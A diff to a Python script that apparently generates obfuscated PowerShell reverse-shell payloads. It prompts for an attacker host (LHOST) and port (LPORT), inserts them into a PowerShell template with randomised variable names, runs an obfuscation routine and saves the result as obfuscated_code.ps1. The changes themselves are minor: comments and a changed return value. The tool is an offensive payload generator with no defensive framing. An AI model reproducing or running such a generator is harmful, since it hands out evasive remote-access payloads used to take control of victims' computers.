@@ -1,4 +1,5 @@
 import random
+import sys
 
 def gen_obfuscated_code(input_str):
     obfuscated_code = ''
@@ -26,11 +27,11 @@ def random_string(length):
     return ''.join(random.choice(letters) for _ in range(length))
 
 def main():
-    
+    # The input PowerShell code
     LHOST = input("Enter LHOST: ")
     LPORT = input("Enter LPORT: ")
 
-    
+    # The input PowerShell code with user-provided values
     input_code = f'''$5f42fd19c74c49aa9853bf5cc59ea009 = "{LHOST}"
 $964823d889b24b32ab50639b3200558a = "{LPORT}"
 function prompt {{
@@ -85,8 +86,8 @@ $324add2cb7df42bcbb996369abde03a9.Close()
 
 '''
 
-    # Generate obfuscated code
-    obfuscated_code = gen_obfuscated_code(input_code)
+    # Generate obfuscated code and variable calls
+    obfuscated_code, variable_calls = gen_obfuscated_code(input_code)
 
     # Save the obfuscated code to a file
     with open('obfuscated_code.ps1', 'w') as file:
@@ -95,4 +96,4 @@ $324add2cb7df42bcbb996369abde03a9.Close()
 
 if __name__ == '__main__':
     main()
-
+    
